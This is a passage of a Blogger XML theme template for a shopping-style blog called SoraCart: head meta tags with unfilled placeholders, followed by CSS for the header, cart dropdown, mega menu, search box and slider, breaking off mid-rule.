<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <head>
      <!-- [ Meta Tag SEO ] -->
<include expiration='7d' path='*.css'/>
<include expiration='7d' path='*.js'/>
<include expiration='3d' path='*.gif'/>
<include expiration='3d' path='*.jpeg'/>
<include expiration='3d' path='*.jpg'/>
<include expiration='3d' path='*.png'/>
<meta content='sat, 02 jun 2020 00:00:00 GMT' http-equiv='expires'/>
<meta charset='utf-8'/>
<meta content='width=device-width, initial-scale=1' name='viewport'/>
<link href='http://fonts.googleapis.com/css?family=Lato:400,400i,700|Raleway:400,400i,600,700|Righteous' media='all' rel='stylesheet' type='text/css'/>
<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet'/>
<meta content='blogger' name='generator'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<link href='http://www.blogger.com/openid-server.g' rel='openid.server'/>
<link expr:href='data:blog.homepageUrl' rel='openid.delegate'/>
<link expr:href='data:blog.url' rel='canonical'/>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<title><data:blog.pageTitle/></title>
<b:else/>
<b:if cond='data:blog.pageType != &quot;error_page&quot;'>
<title><data:blog.pageName/> - <data:blog.title/></title>
</b:if></b:if>
<b:if cond='data:blog.pageType == &quot;error_page&quot;'>
<title>Page Not Found - <data:blog.title/></title>
</b:if>
<b:if cond='data:blog.pageType == &quot;archive&quot;'>
<meta content='noindex' name='robots'/>
</b:if>
<b:if cond='data:blog.searchLabel'>
<meta content='noindex,nofollow' name='robots'/>
</b:if>
<b:if cond='data:blog.isMobile'>
<meta content='noindex,nofollow' name='robots'/>
</b:if>
<b:if cond='data:blog.pageType != &quot;error_page&quot;'>
<meta expr:content='data:blog.metaDescription' name='description'/>
<script type='application/ld+json'>{ &quot;@context&quot;: &quot;http://schema.org&quot;, &quot;@type&quot;: &quot;WebSite&quot;, &quot;url&quot;: &quot;<data:blog.homepageUrl/>&quot;, &quot;potentialAction&quot;: { &quot;@type&quot;: &quot;SearchAction&quot;, &quot;target&quot;: &quot;<data:blog.homepageUrl/>?q={search_term}&quot;, &quot;query-input&quot;: &quot;required name=search_term&quot; } }</script>
<b:if cond='data:blog.homepageUrl != data:blog.url'>
<meta expr:content='data:blog.pageName + &quot;, &quot; + data:blog.pageTitle + &quot;, &quot; + data:blog.title' name='keywords'/>
</b:if></b:if>
 <b:if cond='data:blog.pageType == &quot;index&quot;'>
    <meta content='YOUR DESCRIPTION HERE' name='description'/>
    </b:if>
    <meta content='YOUR KEYWORDS HERE' name='keywords'/>
<link expr:href='data:blog.homepageUrl + &quot;feeds/posts/default&quot;' expr:title='data:blog.title + &quot; - Atom&quot;' rel='alternate' type='application/atom+xml'/>
<link expr:href='data:blog.homepageUrl + &quot;feeds/posts/default?alt=rss&quot;' expr:title='data:blog.title + &quot; - RSS&quot;' rel='alternate' type='application/rss+xml'/>
<link expr:href='&quot;http://www.blogger.com/feeds/&quot; + data:blog.blogId + &quot;/posts/default&quot;' expr:title='data:blog.title + &quot; - Atom&quot;' rel='alternate' type='application/atom+xml'/>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<b:if cond='data:blog.postImageThumbnailUrl'>
<link expr:href='data:blog.postImageThumbnailUrl' rel='image_src'/>
</b:if></b:if>
<link expr:href='data:blog.url' hreflang='x-default' rel='alternate'/>
<link href='/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='https://plus.google.com/USER-GOOGLE-PLUS/posts' rel='publisher'/>
<link href='https://plus.google.com/USER-GOOGLE-PLUS/about' rel='author'/>
<link href='https://plus.google.com/USER-GOOGLE-PLUS' rel='me'/>
<meta content='CODE-VALIDATION-GOOGLE-WEBMASTER' name='google-site-verification'/>
<meta content='CODE-VALIDATION-BING-WEBMASTER' name='msvalidate.01'/>
<meta content='YOUR-COUNTRY' name='geo.placename'/>
<meta content='YOUR-NAME' name='Author'/>
<meta content='general' name='rating'/>
<meta content='YOUR-COUNTRY-CODE' name='geo.country'/>
<!-- [ Social Media Meta Tag ] -->
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<meta expr:content='data:blog.pageName' property='og:title'/>
<meta expr:content='data:blog.canonicalUrl' property='og:url'/>
<meta content='article' property='og:type'/>
</b:if>
<meta expr:content='data:blog.title' property='og:site_name'/>
<b:if cond='data:blog.url == data:blog.homepageUrl'>
<meta expr:content='data:blog.metaDescription' name='description'/>
<meta expr:content='data:blog.title' property='og:title'/>
<meta content='website' property='og:type'/>
<b:if cond='data:blog.metaDescription'>
<meta expr:content='data:blog.metaDescription' property='og:description'/>
<b:else/>
<meta expr:content='&quot;Silakan kunjungi &quot; + data:blog.pageTitle + &quot; Untuk membaca postingan menarik.&quot;' property='og:description'/>
</b:if>
</b:if>
<b:if cond='data:blog.postImageUrl'>
<meta expr:content='data:blog.postImageUrl' property='og:image'/>
<b:else/>
<b:if cond='data:blog.postImageThumbnailUrl'>
<meta expr:content='data:blog.postThumbnailUrl' property='og:image'/>
<b:else/>
<meta content='https://3.bp.blogspot.com/-Hjc6_7njIRs/WIsN28cBbYI/AAAAAAAACL4/tyYVf_C1WGwqUEpqQAzvdvE0F3L7X-6pgCLcB/s125-c/Logo%2BPsd.png' property='og:image'/>
</b:if>
</b:if>
<meta content='https://www.facebook.com/PROFILE-LINK' property='article:author'/>
<meta content='https://www.facebook.com/FAN-PAGE-FACEBOOK' property='article:publisher'/>
<meta content='CODE-APPLICATION-FACEBOOK' property='fb:app_id'/>
<meta content='CODE-ADMIN-FACEBOOK' property='fb:admins'/>
<meta content='en_US' property='og:locale'/>
<meta content='en_GB' property='og:locale:alternate'/>
<meta content='id_ID' property='og:locale:alternate'/>
<meta content='summary' name='twitter:card'/>
<meta expr:content='data:blog.pageTitle' name='twitter:title'/>
<meta content='USER-TWITTER' name='twitter:site'/>
<meta content='USER-TWITTER' name='twitter:creator'/>    
  <b:skin><![CDATA[/* 
-----------------------------------------------
Blogger Template Style
Name:        SoraCart
Author :     http://www.soratemplates.com
License:     Free Version
----------------------------------------------- */
/* Variable definitions
-----------------------
<Variable name="maincolor" description="Primary Color" type="color" default="#fa5555"  value="#fa5555"/>
-----------------------
*/
/*****************************************
reset.css
******************************************/
html, body, .section, .widget, div, span, applet, object, iframe,
h1, h2, h3, h4, h5, h6, p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, font, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td, figure {    margin: 0;    padding: 0;}
html {   overflow-x: hidden;}
a {text-decoration:none;color:#000;}
article,aside,details,figcaption,figure,
footer,header,hgroup,menu,nav,section {     display:block;}
table {    border-collapse: separate;    border-spacing: 0;}
caption, th, td {    text-align: left;    font-weight: normal;}
blockquote:before, blockquote:after,
q:before, q:after {    content: "";}
.quickedit, .home-link{display:none;}
blockquote, q {    quotes: "" "";}
sup{    vertical-align: super;    font-size:smaller;}
code{    font-family: 'Courier New', Courier, monospace;    font-size:12px;    color:#272727;}
::selection {background:transparent; text-shadow:#000 0 0 2px;}
::-moz-selection {background:transparent; text-shadow:#000 0 0 2px;}
::-webkit-selection {background:transparent; text-shadow:#000 0 0 2px;}
::-o-selection {background:transparent; text-shadow:#000 0 0 2px;}
a img{	border: none;}
ol, ul { padding:0;  margin:0;  text-align: left;  }
ol li { list-style-type: decimal;  padding:0 0 5px;  }
ul li { list-style-type: disc;  padding: 0 0 5px;  }
ul ul, ol ol { padding: 0; }
#navbar-iframe, .navbar {   height:0px;   visibility:hidden;   display:none   }
.feed-links, .Attribution, .post-footer-line.post-footer-line-1, .post-footer-line.post-footer-line-2 , .post-footer-line.post-footer-line-3 {
display: none;
}
div#ContactForm1 {
    display: none;
    visibility: hidden;
    opacity: 0;
}
.item-control {
display: none !important;
}
h2.date-header, h4.date-header {display:none;margin:1.5em 0 .5em}
h1, h2, h3, h4, h5, h6 {
font-family:  'Raleway', sans-serif;
font-weight: 600;
color: #2e2e2e;
}
blockquote {
padding: 8px;
background-color: #faebbc;
border-top: 1px solid #e1cc89;
border-bottom: 1px solid #e1cc89;
margin: 5px;
background-image: url(http://1.bp.blogspot.com/-siy6EKYCLtM/U6X4AdKrr0I/AAAAAAAANDs/HCjRvuedDro/s1600/openquote1.gif);
background-position: top left;
background-repeat: no-repeat;
text-indent: 23px;
}
blockquote p{
display: block;
background-image: url(http://3.bp.blogspot.com/-UjppXQI-ww0/U6X4IpheNiI/AAAAAAAAND0/PJhRvvhAWGU/s1600/closequote1.gif);
background-repeat: no-repeat;
background-position: bottom right;
}
img {
    max-width: 100%;
    vertical-align: middle;
    border: 0;
}
.widget iframe, .widget img {
    max-width: 100%;
}
#loader {
position: fixed;
top: 0;
left: 0;
right: 0;
width: 100%;
height: 100%;
background-color: #FFF;
z-index: 1000;
}
#status {
width: 200px;
height: 200px;
position: fixed;
left: 50%;
z-index: 100;
top: 50%;
background-image: url(https://3.bp.blogspot.com/-mkWkfjDXD88/WVpRC76s5SI/AAAAAAAADME/4T4q4ulAsyo196NUYQ_EttfTPYxiHrGTQCLcBGAs/s1600/ripple.gif);
background-repeat: no-repeat;
background-position: center;
margin: -100px 0 0 -100px;
z-index: 1001;
}
/*****************************************
Custom css starts
******************************************/
body {
color: #333;
font-family:'Lato', sans-serif;
font-size: 14px;
font-weight: normal;
line-height: 21px;
background: #ffffff;
}
/*css*/
.megasubmenu {
width: 149px !important;
background: #EEEEEE !important;
}
/* ######## Wrapper Css ######################### */
#outer-wrapper{max-width:100%;margin:0 auto;background-color:#FFF;box-shadow:0 0 5px RGBA(0, 0, 0, 0.2)}
.row{width:1063px}
#content-wrapper {
margin: 0 auto;
padding: 20px 0 40px;
overflow: hidden;
}
.item #main-wrapper, .statc_page #main-wrapper {
float: left;
width: 68%;
max-width: 800px;
}
.index #main-wrapper, .archive #main-wrapper {
float:none;
width:100%;
max-width:100%
}
.item #sidebar-wrapper, .statc_page #sidebar-wrapper {
float: right;
width: 30%;
max-width: 330px;
}
.index #sidebar-wrapper, .archive #sidebar-wrapper {
display:none;
visibility:hidden;
height:0;
opacity:0;
}
/* ######## Top Header Bar Css ######################### */
.top-bar {
   background-color: #f0f0f0;
}
.top-bar-wrapper {
position: relative;
overflow: hidden;
min-height:40px;
color: #fff;
margin:0 auto;
}
.top-bar-menu {
float: left;
}
.top-menu ul {
overflow: hidden;
list-style: none;
padding: 0;
margin: 0;
}
.top-menu ul li {
float: left;
display: inline-block;
list-style: none;
padding:0;
}
.top-menu ul li:first-child a {
padding: 12px 12px 12px 0;
}
.top-menu ul li a {
padding: 12px 16px;
display: block;
border: none !important;
text-decoration: none;
line-height: inherit;
font-size: 14px;
font-weight: normal;
color:#696969;
    text-transform: uppercase;
    font-family: Raleway;
    letter-spacing: 1px;
}
.top-meta-menu {
    float: right;
}
.top-meta-menu ul {
overflow: hidden;
list-style: none;
padding: 0;
margin: 0;
}
.top-meta-menu ul li {
float: left;
display: inline-block;
list-style: none;
padding:0;
}
.top-meta-menu ul li:last-child a {
padding: 12px 0 12px 16px;
}
.top-meta-menu ul li a {
padding: 12px 16px;
display: block;
border: none !important;
text-decoration: none;
line-height: inherit;
font-size: 14px;
font-weight: normal;
color:#696969;
}
.top-meta-menu ul li a i {
text-align:center;
display: inline-block;
    width: 20px;
    height: 20px;
    line-height: 20px;
    font-size: 12px;
    color: #fff;
margin-right:5px;
    background: $maincolor;
    transition: background 0.3s linear;
    -moz-transition: background 0.3s linear;
    -webkit-transition: background 0.3s linear;
    -o-transition: background 0.3s linear;
}
.selectnav {display:none}
/* ######## Header Css ######################### */
#header-wrapper {
}
#header-wrappers {
color: #333;
padding: 20px 0 20px;
margin: 0 auto;
}
#header-inner {
background-position: left;
background-repeat: no;
}
.headerleft img {
height: auto;
margin: 0 0 0;
width:100%;
max-width:100%;
}
.headerleft h1,
.headerleft h1 a,
.headerleft h1 a:hover,
.headerleft h1 a:visited {
        font-family: 'Righteous', cursive;
    color: $maincolor;
    font-size: 45px;
    font-weight: normal;
    line-height: 68px;
    margin: 0;
    padding: 0 0 5px;
    text-decoration: none;
    text-transform: uppercase;
}
.headerleft h1:before {
    content: "\f07a";
    font-family: fontawesome;
    color: #8a8a8a;
    margin-right: 5px;
}
.headerleft h3 {
font-weight: 400;
margin: 0;
padding: 0;
}
.headerleft .description {
color: #000000;
    font: normal 14px Oswald;
    margin: 0;
    padding: 10px 0;
    text-transform: uppercase;
    text-align: left;
}
.headerleft {
float: left;
margin: 0;
padding: 0;
width: auto;
}
.headerright {
float: right;
margin: 0;
padding: 8px 0 0;
width: 720px;
text-align: center;
}
.top-bar-social, .bottom-bar-social {
padding: 0;
}

.top-bar-social li, .bottom-bar-social li {
display: inline;
padding: 0;
float: left;
margin-right: 5px;
;
}
.top-bar-social .widget ul, .bottom-bar-social .widget ul {
padding: 0;
}
.top-bar-social .LinkList ul, .bottom-bar-social .LinkList ul {
text-align: center;
}
.top-bar-social #social a {
display: block;
    width: 30px;
    height: 30px;
    line-height: 30px;
    font-size: 12px;
    color: #fff;
    background: $maincolor;
    -webkit-border-radius: 100%;
    -moz-border-radius: 100%;
    border-radius: 100%;
    transition: background 0.3s linear;
    -moz-transition: background 0.3s linear;
    -webkit-transition: background 0.3s linear;
    -o-transition: background 0.3s linear;
}

.top-bar-social #social a:before, .bottom-bar-social #social a:before {
display: inline-block;
font: normal normal normal 22px/1 FontAwesome;
font-size: inherit;
font-style: normal;
font-weight: 400;
-webkit-font-smoothing: antialiased;
-moz-osx-font-smoothing: grayscale;
}
.top-bar-social .bloglovin:before, .bottom-bar-social .bloglovin:before{content:"\f004"}
.top-bar-social .facebook:before, .bottom-bar-social .facebook:before{content:"\f09a"}
.top-bar-social .twitter:before, .bottom-bar-social .twitter:before{content:"\f099"}
.top-bar-social .gplus:before, .bottom-bar-social .gplus:before{content:"\f0d5"}
.top-bar-social .rss:before, .bottom-bar-social .rss:before{content:"\f09e"}
.top-bar-social .youtube:before, .bottom-bar-social .youtube:before{content:"\f167"}
.top-bar-social .skype:before, .bottom-bar-social .skype:before{content:"\f17e"}
.top-bar-social .stumbleupon:before, .bottom-bar-social .stumbleupon:before{content:"\f1a4"}
.top-bar-social .tumblr:before, .bottom-bar-social .tumblr:before{content:"\f173"}
.top-bar-social .vine:before, .bottom-bar-social .vine:before{content:"\f1ca"}
.top-bar-social .stack-overflow:before, .bottom-bar-social .stack-overflow:before{content:"\f16c"}
.top-bar-social .linkedin:before, .bottom-bar-social .linkedin:before{content:"\f0e1"}
.top-bar-social .dribbble:before, .bottom-bar-social .dribbble:before{content:"\f17d"}
.top-bar-social .soundcloud:before, .bottom-bar-social .soundcloud:before{content:"\f1be"}
.top-bar-social .behance:before, .bottom-bar-social .behance:before{content:"\f1b4"}
.top-bar-social .digg:before, .bottom-bar-social .digg:before{content:"\f1a6"}
.top-bar-social .instagram:before, .bottom-bar-social .instagram:before{content:"\f16d"}
.top-bar-social .pinterest:before, .bottom-bar-social .pinterest:before{content:"\f0d2"}
.top-bar-social .delicious:before, .bottom-bar-social .delicious:before{content:"\f1a5"}
.top-bar-social .codepen:before, .bottom-bar-social .codepen:before{content:"\f1cb"}
.top-bar-social .email:before, .bottom-bar-social .email:before{content:"\f0e0"}

.top-bar-social ul#social a:hover, .bottom-bar-social ul#social a:hover {
color: #fff;
opacity: 1;
}
.header-social {display:inline-block;}
/* ######## Shopping Cart Css ######################### */
.sora-cart {
    float: right;
    width: 180px;
    padding: 0px;
    cursor: pointer;
    position: relative;
}
.sora-cart-logo {
    position: relative;
    display: block;
    padding: .4em .4em .4em 2em;
    margin: 0;
    background: #f0f0f0;
    color: #444;
    text-decoration: none;
    -webkit-transition: all .3s ease-out;
    -moz-transition: all .3s ease-out;
    -ms-transition: all .3s ease-out;
    -o-transition: all .3s ease-out;
    transition: all .3s ease-out;
}
.sora-cart-logo:before {
    content: "\f290";
    font-family: fontawesome;
    position: absolute;
    left: -1.3em;
    top: 50%;
    margin-top: -1.3em;
    background: $maincolor;
    color: #fff;
    height: 2em;
    width: 2em;
    line-height: 2em;
    border: .3em solid #fff;
    text-align: center;
    font-weight: bold;
    -moz-border-radius: 2em;
    -webkit-border-radius: 2em;
    border-radius: 2em;
    -webkit-transition: all .3s ease-out;
    -moz-transition: all .3s ease-out;
    -ms-transition: all .3s ease-out;
    -o-transition: all .3s ease-out;
    transition: all .3s ease-out;
}
.sora-cart-details {
    
}
.sora-cart-description {
   background: #fff none repeat scroll 0 0;
    border-top: 2px solid $maincolor;
    padding: 10px 15px;
    position: absolute;
    right: 0;
    text-align: left;
    top: 100%;
    -webkit-transform: translateY(40px);
    transform: translateY(40px);
    -webkit-transition: all 0.5s ease 0s;
    transition: all 0.5s ease 0s;
    width: 273px;
visibility: hidden;
    z-index: -99;
        
}
.sora-cart:hover .sora-cart-description {
    margin-top: 0;
    -webkit-transform: translateY(0px);
    transform: translateY(0px);
    visibility: visible;
    z-index: 99999;
}
.sora-cart-description .itemRow {
    display: block;
    margin-bottom: 15px;
    overflow: hidden;
    border-bottom: 1px solid #eee;
    background-color: #fff;
    color: #111;
    padding: 10px;
    position: relative;
}
.sora-cart-description .itemRow:last-child {
border-bottom:0;
}
.sora-cart-description .item-thumb {
    float: left;
    width: 70px;
margin-right: 10px;
}
.sora-cart-description .item-thumb img {
    width: 100%;
    vertical-align: middle;
    object-fit: cover;
}
.sora-cart-description .item-name {
    display: block;
   font-size: 16px;
    font-weight: 600;
    line-height: 1.25;
    margin-bottom: 10px;
    margin-right: 12px;
    text-transform: capitalize;
    width: auto;
    font-family: Raleway;
}
.sora-cart-description .item-price {
    font-size: 13px;
    line-height: 1.25;
    margin-bottom: 10px;
}
.sora-cart-description .item-decrement, .sora-cart-description .item-increment {
    width: 15px;
    float: left;
    text-align: center;
}
.sora-cart-description .item-decrement, .sora-cart-description .item-quantity {
    float: left;
    margin-right: 5px;
    font-size: 16px;
}
.sora-cart-description .item-decrement a, .sora-cart-description .item-increment a {
    text-decoration: none;
    padding: 1px 4px;
    height: 20px;
    font-size: 15px;
    text-align: center;
    color: $maincolor;
    display: inline-block;
}
.sora-cart-description .item-quantity {
    margin: 0px 10px 0px 5px;
}
.sora-cart-description .item-total {
    margin: 10px 0;
    font-size: 16px;
}
.sora-cart-description .item-increment {
    margin-right: 5px;
}
.sora-cart-description .item-remove {
    position: absolute;
    right: 0;
    top: 10px;
    color: $maincolor;
    line-height: 16px;
}
.sora-cart-description .item-remove a {
    color: $maincolor;
font-size:16px;
}
.sora-cart-description .simpleCart_empty, .sora-cart-description .simpleCart_checkout {
    transition: all .3s;
    background: $maincolor;
    padding: 5px 12px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 12px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: bold;
    white-space: nowrap;
}
.sora-cart-description .simpleCart_empty:before, .sora-cart-description .simpleCart_checkout:before {
content: '\f00d';
    font-family: FontAwesome;
    margin-right: 5px;
}
.sora-cart-description .simpleCart_checkout:before {
content: '\f07a';
}
.sora-cart-buttons-wrap {
    border-top: 1px solid #eeeeee;
}
.sora-cart-buttons-wrap .sora-cart-ammount {
    clear: both;
    font-size: 14px;
    margin: 10px 0;
    font-weight: normal;
    text-transform: uppercase;
}
.sora-cart-buttons-wrap .sora-cart-ammount .sora-cart-subtotal {
    font-size: 16px;
    font-weight: bold;
    display: inline-block;
    float: left;
}
.sora-cart-buttons-wrap .sora-cart-ammount .simpleCart_total {
    float: right;
}
.sora-cart-buttons {
    text-align: center;
    display: block;
    clear: both;
}
/* ######## Megamenu Css ######################### */
.mega-menu-full {
    background: $maincolor;
}
.mega-menu-wrap #pull {
    display: none;
}
.mega-menu-wrap {
    margin: 0 auto;
    padding: 0;
    position: relative;
}
ul.megamenu {
    list-style: none;
    line-height: 1;
    overflow: visible !important
}
ul.megamenu:after {
    margin: 0;
    padding: 0;
    content: ' ';
    display: block;
    height: 0px;
    clear: both
}
ul.megamenu li {
    float: left;
    display: inline;
    position: relative;
    text-transform: uppercase;
    padding: 0;
}
ul.megamenu li a.menu-target:after {
    content: "";
    width: 0;
    height: 0;
    border-left: 3px solid transparent;
    border-right: 3px solid transparent;
    border-top: 3px solid #fff;
    font-size: 0;
    line-height: 0;
    bottom: 22px;
    right: 5px;
    position: absolute
}
ul.megamenu li a {
    display: block;
    line-height: 50px;
    padding: 0px 20px;
    text-decoration: none;
    color: #fff;
    font-size: 14px;
 font-weight: bold;
font-family:Raleway;
    transition: all 0.3s ease-in-out
}
ul.megamenu li a:hover {
    background: #e63737;
    color: #fff
}
ul.megamenu ul {
    position: absolute;
    display: none;
    top: 100%
}
ul.megamenu li:hover > ul {
    display: block
}
ul.megamenu ul li {
    z-index: 72;
    min-width: 149px;
    float: none;
    background: #000;
    text-shadow: none
}
ul.megamenu ul li a {
    text-transform: none;
    font-weight: normal
}
ul.megamenu ul li a:hover,
ul.megamenuid ul li a.hover {
    background: #E0E0E0;
    color: #444
}
ul.megamenu ul ul {
    display: none;
    left: 100%;
    top: 0
}
ul.megamenuid li div.megasubmenu {
    background: #F9F9F9;
    position: absolute;
    width: 830px;
    z-index: 90;
    left: 0;
    top: 100%;
    overflow: hidden;
    min-height: 150px;
    -moz-transform: translate(0, 30px);
    -webkit-transform: translate(0, 30px);
    -o-transform: translate(0, 30px);
    transform: translate(0, 30px);
    transform-origin: 50% 0;
    visibility: hidden;
    opacity: 0;
    color: #888;
    box-shadow: 0 10px 7px -7px rgba(0, 0, 0, 0.1);
    transition: all 0.3s ease-in-out
}
ul.megamenuid li:hover div.megasubmenu {
    visibility: visible;
    opacity: 1;
    -moz-transform: translate(0, 0);
    -webkit-transform: translate(0, 0);
    -o-transform: translate(0, 0);
    transform: translate(0, 0)
}
ul.megamenuid ul,
ul.megamenuid ul li {
    display: block !important;
    border: 0 none !important;
    margin: 0 !important;
    padding: 0 !important
}
ul.megamenuid ul li {
    background: none !important;
    float: left !important
}
ul.megamenuid ul.leftmenulist {
    position: absolute;
    width: 18%;
    left: 0;
    top: 0;
    bottom: 0;
    background: #EEEEEE;
    border-right: 1px dashed #e5e5e5 !important
}
ul.megamenuid ul.leftmenulist a {
    border-left: none !important;
    color: #555
}
ul.megamenuid ul.rightmenulist {
    position: relative;
    display: block;
    width: 81%;
    float: right;
    margin: 0px 0px 0px !important;
    background: none
}
ul.megamenuid ul.rightmenulist li {
    display: block;
    overflow: hidden;
    position: relative;
    min-height: 210px;
    padding: 5px 17px 5px 0px !important
}
ul.megamenuid ul.rightmenulist li .thumb-container {
    left: 0;
    width: 100%;
    height: 100%;
    position: absolute;
    overflow: hidden;
    font-size: 0;
    line-height: 0
}
ul.megamenuid ul.rightmenulist li .thumb-container img {
    position: relative;
    top: 10px;
    padding: 0;
    width: 100%;
    height: 100%;
    display: block
}
ul.megamenuid ul.rightmenulist li a {
    display: block;
    border-left: none !important;
    padding: 0px 5px !important;
    line-height: 1.4;
    color: #777;
    font-weight: bold;
    font-size: 14px
}
ul.megamenuid ul.rightmenulist li a:hover {
    color: #000;
    background: transparent
}
ul.megamenuid .loading-icon {
    background: url('http://2.bp.blogspot.com/-N9HNU11nhiA/Va-NLcGF0lI/AAAAAAAALW4/HzSlCK7PGeY/s1600/wait.gif') no-repeat scroll 0 0 transparent;
    width: 22px;
    height: 22px;
    position: absolute;
    top: 50%;
    margin-top: -11px;
    right: 5px
}
ul.megamenuid .menu-icon {
    border-bottom: 4px solid transparent;
    border-top: 4px solid transparent;
    border-left: 4px solid #777;
    display: block;
    height: 0;
    margin-top: -4px;
    position: absolute;
    right: 11px;
    top: 50%;
    width: 0
}
#megamenuid {
    height: 50px;
    position: relative;
    margin: 0 auto;
    padding: 0px
}
#megamenuid h5 {
    font-size: 16px;
    margin-top: 70px;
    text-align: center
}
#megamenuid h5:before {
    content: "";
    position: absolute;
    top: 50px;
    left: 50%;
    width: 5px;
    height: 2px;
    margin-left: -4px;
    border-left: 2px solid black;
    border-right: 2px solid black
}
#megamenuid h5:after {
    content: "";
    position: absolute;
    top: 55px;
    left: 50%;
    width: 10px;
    height: 5px;
    margin-left: -7px;
    border-top: 2px solid black;
    border-left: 2px solid black;
    border-right: 2px solid black;
    border-radius: 8px 8px 0px 0px
}
#search-icon {
    position: absolute;
    right: 0;
    top: 0;
    display: block;
    width: 50px;
    line-height: 50px;
    height: 50px;
    background-color: rgba(255, 255, 255, 0.1);
    color: #fff;
    font-size: 14px;
    text-align: center;
    cursor: pointer
}
#nav-search {
    position: absolute;
    right: 0;
    top: 50px;
    z-index: 50;
    display: none;
    width: 302px;
    height: 74px;
    background-color: #222;
    border-bottom: 2px solid #fa555;
    transition: all 0s ease;
    -webkit-transition: all 0s ease;
    -moz-transition: all 0s ease;
    -o-transition: all 0s ease
}
#nav-search #searchform {
    width: 262px;
    position: absolute;
    left: 20px;
    top: 20px
}
#searchform {
    position: relative;
    height: 36px;
    overflow: hidden
}
#nav-search #s {
    width: 166px
}
#s {
    position: relative;
    height: 32px;
    padding-left: 12px;
    padding-right: 82px;
    border: 1px solid rgba(255, 255, 255, 0.05);
    background-color: rgba(0, 0, 0, 0.1);
    font-size: 13px;
    color: #fff
}
#s:focus {
    color: #fff;
    outline: none
}
#searchsubmit {
    position: absolute;
    right: 2px;
    top: 2px;
    height: 32px;
    padding: 0 10px;
    color: #fff;
    background-color: $maincolor;
    font-size: 12px;
    font-weight: 700;
    text-transform: uppercase;
    border: none;
    cursor: pointer;
    transition: background .3s
}
#searchsubmit:hover {
    background-color: rgba(250, 85, 83, 0.72)
}
@keyframes slideInDown {
    from {
        -webkit-transform: translate3d(0, -100%, 0);
        transform: translate3d(0, -100%, 0);
        visibility: visible
    }
    to {
        -webkit-transform: translate3d(0, 0, 0);
        transform: translate3d(0, 0, 0)
    }
}
/* ######## Slider and Vertical Menu ######################### */
.slide-menu-wrap {
    margin: 15px auto;
overflow:hidden;
}
.slide-menu-wrap .vertical-menu {
    width: 25%;
    float: left;
}
.slide-menu-wrap .vertical-menu .slide-menu {
    border: 1px solid #eaeaea;
}
.slide-menu-wrap .vertical-menu .slide-menu h2 {
    position: relative;
    overflow: hidden;
    margin: 0;
    font-size: 15px;
    vertical-align: middle;
    padding: 8px 10px;
    font-weight: 600;
    background: #eaeaea;
    color: #8a8a8a;
    text-transform: uppercase;
    letter-spacing: 1.22px;
}
.slide-menu-wrap .vertical-menu .slide-menu h2:before {
    content: '\f022';
    font-family: FontAwesome;
    margin-right: 5px;
}
.slide-menu-wrap .vertical-menu ul {
overflow: hidden;
list-style: none;
padding: 0;
margin: 0;
}
.slide-menu-wrap .vertical-menu ul li {
display: block;
list-style: none;
padding:0;
    border-bottom: 1px solid #eaeaea;
}
.slide-menu-wrap .vertical-menu ul li:last-child {
border-bottom:none;
}
.slide-menu-wrap .vertical-menu ul li a {
    padding: 10.5px 16px;
    display: block;
    border: none !important;
    text-decoration: none;
    line-height: inherit;
    font-size: 12px;
    font-weight: bold;
    color: #696969;
    text-transform: uppercase;
}
.slide-menu-wrap .vertical-menu ul li a i {
    margin-right: 5px;
}
.feat-slider-wrap {
        position: relative;
    float: right;
    width: 73.5%;
}

.ty-slide-show {
overflow: hidden;
}
.ty-slide-show ul {
padding:0;
list-style:none;
}
.ty-slide-show li {
list-style:none;
padding:0;
}
.ty-slide .ty-wow {
    overflow: hidden;
    border-bottom: 1px solid #F5F5F5;
    padding: 0;
position:relative;
}
.ty-slide .ty-thumb-bonos img {
    position: relative;
    float: left;
    margin: 0!important;
    width: 100%;
    height: 320px;
    overflow: hidden;
    display: block;
    vertical-align: middle;
object-fit:cover;
}
.ty-slide .ty-slide-con {
        position: absolute;
    bottom: 10px;
    display: table;
    width: 100%;
    height: 10%;
    z-index: 2;
    box-sizing: border-box;
    text-align: center;
    -webkit-transition: all 0.2s ease-in-out;
    -moz-transition: all 0.2s ease-in-out;
    -ms-transition: all 0.2s ease-in-out;
    -o-transition: all 0.2s ease-in-out;
    transition: all 0.2s ease-in-out;
}
.ty-slide .ty-slide-con-tab {
    display: table-cell;
    vertical-align: middle;
}
.ty-slide .ty-slide-con-cell {
    position: relative;
    width: 80%;
    margin: 0 auto;
    padding: 20px 10px;
}
.ty-slide .ty-bonos-entry {
    overflow: hidden;
    line-height: 0;
    margin: 10px 0 10px;
    padding: 0 10px;
}
.ty-slide .ty-bonos-entry a {
    color: #fff;
    font-weight: 700;
letter-spacing:4px;
text-transform:capitalize;
    font-size: 20px;
    line-height: 20px;
-webkit-transition: all 0.2s ease-in-out;
-moz-transition: all 0.2s ease-in-out;
-ms-transition: all 0.2s ease-in-out;
-o-transition: all 0.2s ease-in-out;
transition: all 0.2s ease-in-out;
}
.ty-slide .ty-bonos-entry a:hover {
   
}
.yard-auth-ty {
   
}
.yard-auth-ty,
.ty-time {
    color: #bdbdbd;
    font-size: 12px;
    font-weight: 400;
'Merriweather', serif
}

.tyimg-lay {
    content: no-close-quote;
    position: absolute;
    left: 0;
    bottom: 0;
    height: 100%;
    width: 100%;
    opacity: 0.5;
    background: -webkit-linear-gradient(top,rgba(0,0,0,0.2) 50%,rgba(0,0,0,0.5) 70%,rgba(0,0,0,1) 100%);
    background: -moz-linear-gradient(top,rgba(0,0,0,0.2) 50%,rgba(0,0,0,0.5) 70%,rgba(0,0,0,1) 100%);
